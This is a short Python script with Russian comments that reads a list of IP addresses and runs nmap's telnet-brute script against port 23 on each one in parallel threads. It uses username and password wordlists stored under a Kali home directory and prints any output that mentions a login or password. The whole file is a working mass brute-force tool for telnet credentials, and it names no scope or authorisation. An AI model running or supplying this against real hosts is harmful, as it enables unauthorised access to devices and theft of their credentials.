import subprocess
import concurrent.futures

# Функция для чтения IP-адресов из файла
def read_ip_list(file_path):
    with open(file_path, 'r') as file:
        ip_list = [line.strip() for line in file if line.strip()]
    return ip_list

# Функция для выполнения команды nmap
def run_nmap(ip):
    try:
        result = subprocess.run(
            ['nmap', '-p', '23', '--script', 'telnet-brute',
             '--script-args', 'userdb=/home/kali/usrssh.txt,passdb=/home/kali/passh.txt,telnet-brute.timeout=8s', ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=300
        )
        
        if 'login' in result.stdout.lower() or 'password' in result.stdout.lower():
            print(f"Login and password found for {ip}:\n{result.stdout}")
        else:
            print(f"No valid login found for {ip}")
    except subprocess.TimeoutExpired:
        print(f"Command timed out for {ip}")

# Основная функция для многопоточной обработки
def main():
    ip_addresses = read_ip_list('iplist.txt')
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(run_nmap, ip_addresses)

if __name__ == "__main__":
    main()
